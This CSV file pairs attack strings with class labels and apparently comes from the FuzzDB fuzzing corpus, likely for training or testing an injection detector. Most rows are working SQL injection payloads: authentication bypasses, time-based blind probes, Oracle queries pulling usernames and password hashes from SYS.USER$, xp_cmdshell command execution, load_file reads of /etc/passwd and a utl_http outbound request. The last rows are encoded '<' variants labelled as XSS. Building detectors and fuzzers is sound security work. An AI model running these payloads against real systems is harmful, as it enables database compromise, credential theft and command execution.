id,payload,label
fuzzdb_40,"' union (select NULL, NULL, NULL,  (select @@version)) --",sql_injection
fuzzdb_41,"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",sql_injection
fuzzdb_42,"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",sql_injection
fuzzdb_43,"'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",sql_injection
fuzzdb_44,"'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",sql_injection
fuzzdb_45,"'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",sql_injection
fuzzdb_46,"'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",sql_injection
fuzzdb_47,'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,sql_injection
fuzzdb_48,'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --,sql_injection
fuzzdb_49,'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,sql_injection
fuzzdb_50,'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,sql_injection
fuzzdb_51,1'1,sql_injection
fuzzdb_52,1 exec sp_ (or exec xp_),sql_injection
fuzzdb_53,1 and 1=1,sql_injection
fuzzdb_54,1' and 1=(select count(*) from tablenames); --,sql_injection
fuzzdb_55,1 or 1=1,sql_injection
fuzzdb_56,1' or '1'='1,sql_injection
fuzzdb_57,1or1=1,sql_injection
fuzzdb_58,1'or'1'='1,sql_injection
fuzzdb_59,fake@ema'or'il.nl'='il.nl,sql_injection
fuzzdb_60,1,sql_injection
fuzzdb_61,1 and user_name() = 'dbo',sql_injection
fuzzdb_62,\'; desc users; --,sql_injection
fuzzdb_63,1\'1,sql_injection
fuzzdb_64,1' and non_existant_table = '1,sql_injection
fuzzdb_65,' or username is not NULL or username = ',sql_injection
fuzzdb_66,"1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",sql_injection
fuzzdb_67,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",sql_injection
fuzzdb_68,1 uni/**/on select all from where,sql_injection
fuzzdb_69,’ or ‘1’=’1,sql_injection
fuzzdb_70,' or '1'='1,sql_injection
fuzzdb_71,'||utl_http.request('httP://192.168.1.1/')||',sql_injection
fuzzdb_72,"' || myappadmin.adduser('admin', 'newpass') || '",sql_injection
fuzzdb_73,' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,sql_injection
fuzzdb_74,' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,sql_injection
fuzzdb_75,' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,sql_injection
fuzzdb_76,' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,sql_injection
fuzzdb_77,' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,sql_injection
fuzzdb_78,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,sql_injection
fuzzdb_79,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,sql_injection
fuzzdb_80,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,sql_injection
fuzzdb_81,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,sql_injection
fuzzdb_82,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,sql_injection
fuzzdb_83,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",sql_injection
fuzzdb_84,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",sql_injection
fuzzdb_85,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",sql_injection
fuzzdb_86,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",sql_injection
fuzzdb_87,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",sql_injection
fuzzdb_88,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",sql_injection
fuzzdb_89,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",sql_injection
fuzzdb_90,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",sql_injection
fuzzdb_91,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",sql_injection
fuzzdb_92,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",sql_injection
fuzzdb_93,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",sql_injection
fuzzdb_94,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",sql_injection
fuzzdb_95,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",sql_injection
fuzzdb_96,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",sql_injection
fuzzdb_97,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",sql_injection
fuzzdb_98,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",sql_injection
fuzzdb_99,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",sql_injection
fuzzdb_100,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",sql_injection
fuzzdb_101,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",sql_injection
fuzzdb_102,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",sql_injection
fuzzdb_103,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",sql_injection
fuzzdb_104,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",sql_injection
fuzzdb_105,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",sql_injection
fuzzdb_106,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",sql_injection
fuzzdb_107,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",sql_injection
fuzzdb_108,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",sql_injection
fuzzdb_109,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",sql_injection
fuzzdb_110,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",sql_injection
fuzzdb_111,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",sql_injection
fuzzdb_112,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",sql_injection
fuzzdb_113,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",sql_injection
fuzzdb_114,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",sql_injection
fuzzdb_115,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",sql_injection
fuzzdb_116,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",sql_injection
fuzzdb_117,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",sql_injection
fuzzdb_118,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",sql_injection
fuzzdb_119,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",sql_injection
fuzzdb_120,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",sql_injection
fuzzdb_121,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",sql_injection
fuzzdb_122,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",sql_injection
fuzzdb_123,"<>""'%;)(&+",sql_injection
fuzzdb_124,|,sql_injection
fuzzdb_125,!,sql_injection
fuzzdb_126,?,sql_injection
fuzzdb_127,/,sql_injection
fuzzdb_128,//,sql_injection
fuzzdb_129,//*,sql_injection
fuzzdb_130,',sql_injection
fuzzdb_131,' --,sql_injection
fuzzdb_132,(,sql_injection
fuzzdb_133,),sql_injection
fuzzdb_134,*|,sql_injection
fuzzdb_135,*/*,sql_injection
fuzzdb_136,&,sql_injection
fuzzdb_137,0,sql_injection
fuzzdb_138,031003000270000,sql_injection
fuzzdb_139,0 or 1=1,sql_injection
fuzzdb_140,0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),sql_injection
fuzzdb_141,0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,sql_injection
fuzzdb_142,0x77616974666F722064656C61792027303A303A31302700 exec(@s),sql_injection
fuzzdb_143,"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",sql_injection
fuzzdb_144,1 or 1=1,sql_injection
fuzzdb_145,1;SELECT%20*,sql_injection
fuzzdb_146,1 waitfor delay '0:0:10'--,sql_injection
fuzzdb_147,'%20or%20''=',sql_injection
fuzzdb_148,'%20or%201=1,sql_injection
fuzzdb_149,')%20or%20('x'='x,sql_injection
fuzzdb_150,'%20or%20'x'='x,sql_injection
fuzzdb_151,%20or%20x=x,sql_injection
fuzzdb_152,%20'sleep%2050',sql_injection
fuzzdb_153,%20$(sleep%2050),sql_injection
fuzzdb_154,%21,sql_injection
fuzzdb_155,23 OR 1=1,sql_injection
fuzzdb_156,%26,sql_injection
fuzzdb_157,%27%20or%201=1,sql_injection
fuzzdb_158,%28,sql_injection
fuzzdb_159,%29,sql_injection
fuzzdb_160,%2A%28%7C%28mail%3D%2A%29%29,sql_injection
fuzzdb_161,%2A%28%7C%28objectclass%3D%2A%29%29,sql_injection
fuzzdb_162,%2A%7C,sql_injection
fuzzdb_163,||6,sql_injection
fuzzdb_164,'||'6,sql_injection
fuzzdb_165,(||6),sql_injection
fuzzdb_166,%7C,sql_injection
fuzzdb_167,a',sql_injection
fuzzdb_168,admin' or ',sql_injection
fuzzdb_169,"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",sql_injection
fuzzdb_170,' and 1 in (select var from temp)--,sql_injection
fuzzdb_171,anything' OR 'x'='x,sql_injection
fuzzdb_172,"""a"""" or 1=1--""",sql_injection
fuzzdb_173,a' or 1=1--,sql_injection
fuzzdb_174,"""a"""" or 3=3--""",sql_injection
fuzzdb_175,a' or 3=3--,sql_injection
fuzzdb_176,a' or 'a' = 'a,sql_injection
fuzzdb_177,&apos;%20OR,sql_injection
fuzzdb_178,as,sql_injection
fuzzdb_179,asc,sql_injection
fuzzdb_180,a' waitfor delay '0:0:10'--,sql_injection
fuzzdb_181,'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,sql_injection
fuzzdb_182,bfilename,sql_injection
fuzzdb_183,char%4039%41%2b%40SELECT,sql_injection
fuzzdb_184,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),sql_injection
fuzzdb_185,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),sql_injection
fuzzdb_186,declare @q nvarchar (4000) select @q =,sql_injection
fuzzdb_187,declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),sql_injection
fuzzdb_188,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),sql_injection
fuzzdb_189,declare @s varchar(22) select @s =,sql_injection
fuzzdb_190,declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,sql_injection
fuzzdb_191,delete,sql_injection
fuzzdb_192,desc,sql_injection
fuzzdb_193,distinct,sql_injection
fuzzdb_194,"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))",sql_injection
fuzzdb_195,'; exec master..xp_cmdshell,sql_injection
fuzzdb_196,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,sql_injection
fuzzdb_197,exec(@s),sql_injection
fuzzdb_198,'; exec ('sel' + 'ect us' + 'er'),sql_injection
fuzzdb_199,exec sp,sql_injection
fuzzdb_200,'; execute immediate 'sel' || 'ect us' || 'er',sql_injection
fuzzdb_201,exec xp,sql_injection
fuzzdb_202,'; exec xp_regread,sql_injection
fuzzdb_203,' group by userid having 1=1--,sql_injection
fuzzdb_204,handler,sql_injection
fuzzdb_205,having,sql_injection
fuzzdb_206,' having 1=1--,sql_injection
fuzzdb_207,"hi or 1=1 --""",sql_injection
fuzzdb_208,hi' or 1=1 --,sql_injection
fuzzdb_209,"""hi"""") or (""""a""""=""""a""",sql_injection
fuzzdb_210,hi or a=a,sql_injection
fuzzdb_211,hi' or 'a'='a,sql_injection
fuzzdb_212,hi') or ('a'='a,sql_injection
fuzzdb_213,'hi' or 'x'='x';,sql_injection
fuzzdb_214,insert,sql_injection
fuzzdb_215,like,sql_injection
fuzzdb_216,limit,sql_injection
fuzzdb_217,*(|(mail=*)),sql_injection
fuzzdb_218,*(|(objectclass=*)),sql_injection
fuzzdb_219,or,sql_injection
fuzzdb_220,' or ''=',sql_injection
fuzzdb_221,"or 0=0 #""",sql_injection
fuzzdb_222,' or 0=0 --,sql_injection
fuzzdb_223,' or 0=0 #,sql_injection
fuzzdb_224,""" or 0=0 --",sql_injection
fuzzdb_225,or 0=0 --,sql_injection
fuzzdb_226,or 0=0 #,sql_injection
fuzzdb_227,' or 1 --',sql_injection
fuzzdb_228,' or 1/*,sql_injection
fuzzdb_229,; or '1'='1',sql_injection
fuzzdb_230,' or '1'='1,sql_injection
fuzzdb_231,' or '1'='1'--,sql_injection
fuzzdb_232,' or 1=1,sql_injection
fuzzdb_233,' or 1=1 /*,sql_injection
fuzzdb_234,' or 1=1--,sql_injection
fuzzdb_235,' or 1=1--,sql_injection
fuzzdb_236,'/**/or/**/1/**/=/**/1,sql_injection
fuzzdb_237,‘ or 1=1 --,sql_injection
fuzzdb_238,""" or 1=1--",sql_injection
fuzzdb_239,or 1=1,sql_injection
fuzzdb_240,or 1=1--,sql_injection
fuzzdb_241,"or 1=1 or """"=",sql_injection
fuzzdb_242,' or 1=1 or ''=',sql_injection
fuzzdb_243,' or 1 in (select @@version)--,sql_injection
fuzzdb_244,or%201=1,sql_injection
fuzzdb_245,or%201=1 --,sql_injection
fuzzdb_246,' or 2 > 1,sql_injection
fuzzdb_247,' or 2 between 1 and 3,sql_injection
fuzzdb_248,' or 3=3,sql_injection
fuzzdb_249,‘ or 3=3 --,sql_injection
fuzzdb_250,' or '7659'='7659,sql_injection
fuzzdb_251,or a=a,sql_injection
fuzzdb_252,or a = a,sql_injection
fuzzdb_253,' or 'a'='a,sql_injection
fuzzdb_254,' or a=a--,sql_injection
fuzzdb_255,') or ('a'='a,sql_injection
fuzzdb_256,""" or ""a""=""a",sql_injection
fuzzdb_257,) or (a=a,sql_injection
fuzzdb_258,order by,sql_injection
fuzzdb_259,' or (EXISTS),sql_injection
fuzzdb_260,or isNULL(1/0) /*,sql_injection
fuzzdb_261,""" or isNULL(1/0) /*",sql_injection
fuzzdb_262,' or 'something' like 'some%',sql_injection
fuzzdb_263,' or 'something' = 'some'+'thing',sql_injection
fuzzdb_264,' or 'text' = n'text',sql_injection
fuzzdb_265,' or 'text' > 't',sql_injection
fuzzdb_266,' or uid like '%,sql_injection
fuzzdb_267,' or uname like '%,sql_injection
fuzzdb_268,' or 'unusual' = 'unusual',sql_injection
fuzzdb_269,' or userid like '%,sql_injection
fuzzdb_270,' or user like '%,sql_injection
fuzzdb_271,' or username like '%,sql_injection
fuzzdb_272,' or username like char(37);,sql_injection
fuzzdb_273,' or 'whatever' in ('whatever'),sql_injection
fuzzdb_274,' -- &password=,sql_injection
fuzzdb_275,password:*/=1--,sql_injection
fuzzdb_276,PRINT,sql_injection
fuzzdb_277,PRINT @@variable,sql_injection
fuzzdb_278,procedure,sql_injection
fuzzdb_279,replace,sql_injection
fuzzdb_280,select,sql_injection
fuzzdb_281,' select * from information_schema.tables--,sql_injection
fuzzdb_282,' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,sql_injection
fuzzdb_283,' (select top 1,sql_injection
fuzzdb_284,--sp_password,sql_injection
fuzzdb_285,'sqlattempt1,sql_injection
fuzzdb_286,(sqlattempt2),sql_injection
fuzzdb_287,'sqlvuln,sql_injection
fuzzdb_288,'+sqlvuln,sql_injection
fuzzdb_289,(sqlvuln),sql_injection
fuzzdb_290,sqlvuln;,sql_injection
fuzzdb_291,t'exec master..xp_cmdshell 'nslookup www.google.com'--,sql_injection
fuzzdb_292,to_timestamp_tz,sql_injection
fuzzdb_293,truncate,sql_injection
fuzzdb_294,tz_offset,sql_injection
fuzzdb_295,' UNION ALL SELECT,sql_injection
fuzzdb_296,' union all select @@version--,sql_injection
fuzzdb_297,' union select,sql_injection
fuzzdb_298,uni/**/on sel/**/ect,sql_injection
fuzzdb_299,' UNION SELECT,sql_injection
fuzzdb_300,"' union select 1,load_file('/etc/passwd'),1,1,1;",sql_injection
fuzzdb_301,) union select * from information_schema.tables;,sql_injection
fuzzdb_302,"' union select * from users where login = char(114,111,111,116);",sql_injection
fuzzdb_303,update,sql_injection
fuzzdb_304,'||UTL_HTTP.REQUEST,sql_injection
fuzzdb_305,",@variable",sql_injection
fuzzdb_306,@variable,sql_injection
fuzzdb_307,@var select @var as var into temp end --,sql_injection
fuzzdb_308,\x27UNION SELECT,sql_injection
fuzzdb_309,x' AND 1=(SELECT COUNT(*) FROM tabname); --,sql_injection
fuzzdb_310,x' AND email IS NULL; --,sql_injection
fuzzdb_311,x' AND members.email IS NULL; --,sql_injection
fuzzdb_312,x' AND userid IS NULL; --,sql_injection
fuzzdb_313,x' or 1=1 or 'x'='y,sql_injection
fuzzdb_314,x' OR full_name LIKE '%Bob%,sql_injection
fuzzdb_315,ý or 1=1 --,sql_injection
fuzzdb_316,<,xss
fuzzdb_317,%3C,xss
fuzzdb_318,%253C,xss
fuzzdb_319,%25253C,xss
fuzzdb_320,&lt,xss
fuzzdb_321,&lt;,xss
fuzzdb_322,&LT,xss
fuzzdb_323,&LT;,xss
fuzzdb_324,&#60,xss
fuzzdb_325,&#060,xss
fuzzdb_326,&#0060,xss
fuzzdb_327,&#00060,xss
fuzzdb_328,&#000060,xss
fuzzdb_329,&#0000060,xss
fuzzdb_330,&#60;,xss
fuzzdb_331,&#060;,xss
fuzzdb_332,&#0060;,xss
fuzzdb_333,&#00060;,xss
fuzzdb_334,&#000060;,xss
fuzzdb_335,&#0000060;,xss
fuzzdb_336,&#x3c,xss
fuzzdb_337,&#x03c,xss
fuzzdb_338,&#x003c,xss
fuzzdb_339,&#x0003c,xss
fuzzdb_340,&#x00003c,xss
fuzzdb_341,&#x000003c,xss
fuzzdb_342,&#x3c;,xss
fuzzdb_343,&#x03c;,xss
fuzzdb_344,&#x003c;,xss
fuzzdb_345,&#x0003c;,xss
fuzzdb_346,&#x00003c;,xss
fuzzdb_347,&#x000003c;,xss
fuzzdb_348,&#X3c,xss
fuzzdb_349,&#X03c,xss
fuzzdb_350,&#X003c,xss
fuzzdb_351,&#X0003c,xss
fuzzdb_352,&#X00003c,xss
fuzzdb_353,&#X000003c,xss
fuzzdb_354,&#X3c;,xss
fuzzdb_355,&#X03c;,xss
